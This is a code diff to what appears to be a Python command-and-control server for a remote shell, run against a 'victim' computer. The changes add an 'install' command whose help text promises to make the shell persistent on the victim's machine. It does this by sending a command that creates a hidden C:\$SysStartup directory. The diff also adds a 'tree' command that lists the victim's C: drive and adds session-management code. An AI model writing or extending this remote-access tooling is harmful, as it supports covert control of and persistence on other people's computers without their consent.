@@ -26,9 +26,14 @@ SESSION_COMMANDS = ["help", "back", "tree"]
 class Commands:
     def __init__(self):
         self.helpmsg = """
+        menu Commands:
         help: shows this message
         back: gets deselects the session and gets you back to them main menu
         sessions: [-s {sesion id} session id to sellect a session] [-d {sesion id} to dellete a session]
+        
+        session Commands:
+        tree: Shows the entire dirrectorystructure of the 'C:\\' drive
+        install: Makes the shell persistent(starts with the victims computer)
         """
 
     # commands in the main menu
@@ -83,7 +88,11 @@ class Commands:
                 print("you need a  value after your argument!")
 
     # for commands if a session is sellected
-    def session(self, name, conn, addr, message, args=None):
+    def session(self, name, conn, addr, message, decId, args=None):
+        # delets the session and all its inforamtion
+        def delete(decId):
+            pass
+
         # reveives the messages and passes them to the evaluation
         def receiveMessage():
             msg_length = conn.recv(BUFFER).decode(FORMAT)
@@ -114,11 +123,22 @@ class Commands:
 
         # shows the entire dir tree
         elif message == "tree":
-            sendMessage(f"c tree C:\\")
+            sendMessage("c tree C:\\")
+
+        # installs the shell persistently
+        elif message == "install":
+            sendMessage("c mkdir C:\\$SysStartup && cd C:\\ && attrib +h C:\\$SysStartup /d")
 
 
 # gets the commands whenn session is sellected
-def sessionInput(conn, addr, name, id):
+def sessionInput(conn, addr, name, decId):
+    """
+    This is the menu when a session is sellected
+    :param conn: class of the connected clinet
+    :param addr: information like ip and connection id
+    :param name: name of the session
+    :param decId: the id of the session in the list
+    """
     try:
         command = input(f"command({name}): ")
         commandLst = command.split(" ")
@@ -126,19 +146,20 @@ def sessionInput(conn, addr, name, id):
         if commandLst[0] in SESSION_COMMANDS:
             scom = Commands()
             if len(commandLst) > 1:
-                scom.session(name, conn, addr, commandLst[0], commandLst[1:len(commandLst)])
+                scom.session(name, conn, addr, commandLst[0], decId, commandLst[1:len(commandLst)])
             else:
-                scom.session(name, conn, addr, commandLst[0])
-            sessionInput(conn, addr, name, id)
+                scom.session(name, conn, addr, commandLst[0], decId)
+            sessionInput(conn, addr, name, decId)
 
         elif commandLst[0] in COMMANDS:
             print(f"{command} is only availible in the main menu!")
-            sessionInput(conn, addr, name, id)
+            sessionInput(conn, addr, name, decId)
 
         else:
-            sessionInput(conn, addr, name, id)
+            sessionInput(conn, addr, name, decId)
     except ConnectionResetError:
-        sessions.pop(id)
+        sessions.pop(decId)
+        session_ids.pop(decId)
         print("The client is no longer connected")
 
 
@@ -167,6 +188,7 @@ def mainMenu():
         mainMenu()
 
 
+# starts the listening for a connection ip and port can be changed on top of the script
 def startListening():
     server.listen()
     while True:
